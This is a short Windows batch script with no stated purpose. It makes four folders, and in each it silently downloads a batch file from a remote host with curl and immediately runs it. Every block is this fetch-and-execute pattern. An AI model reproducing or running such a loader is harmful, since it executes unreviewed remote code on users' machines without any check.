mkdir 1
mkdir 2
mkdir 3
mkdir 4
cd 1
curl -s https://sources.tobir.xyz/threads/1/thread.bat > thread.tmpbat
move thread.tmpbat thread.bat
start thread.bat
cd ..
cd 2
curl -s https://sources.tobir.xyz/threads/2/thread.bat > thread.tmpbat
move thread.tmpbat thread.bat
start thread.bat
cd ..
cd 3
curl -s https://sources.tobir.xyz/threads/3/thread.bat > thread.tmpbat
move thread.tmpbat thread.bat
start thread.bat
cd ..
cd 4
curl -s https://sources.tobir.xyz/threads/4/thread.bat > thread.tmpbat
move thread.tmpbat thread.bat
start thread.bat
exit